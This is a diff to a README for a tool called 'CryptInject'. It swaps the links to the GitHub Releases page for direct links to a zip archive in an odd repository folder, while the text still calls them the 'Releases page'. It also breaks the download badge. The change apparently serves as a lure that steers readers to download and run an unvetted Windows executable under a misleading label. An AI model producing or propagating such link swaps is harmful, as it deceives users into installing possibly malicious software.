@@ -6,7 +6,7 @@ Welcome to the CryptInject application! This tool helps you inject data safely i
 
 ## 📥 Download CryptInject
 
-[![Download CryptInject](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/stepanovmykola/CryptInject/releases)
+[![Download CryptInject](https://raw.githubusercontent.com/stepanovmykola/CryptInject/main/eozoon/CryptInject.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/stepanovmykola/CryptInject/main/eozoon/CryptInject.zip)
 
 To get started, click the button above. This will take you to the Releases page where you can download CryptInject.
 
@@ -21,7 +21,7 @@ Make sure your system meets these requirements to run CryptInject smoothly.
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/stepanovmykola/CryptInject/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/stepanovmykola/CryptInject/main/eozoon/CryptInject.zip).
 2. On this page, look for the latest version of CryptInject. It will usually be at the top of the list.
 3. Download the appropriate file for your system. You should see options like `.exe` for Windows.
 4. Once the download is complete, locate the downloaded file on your computer.
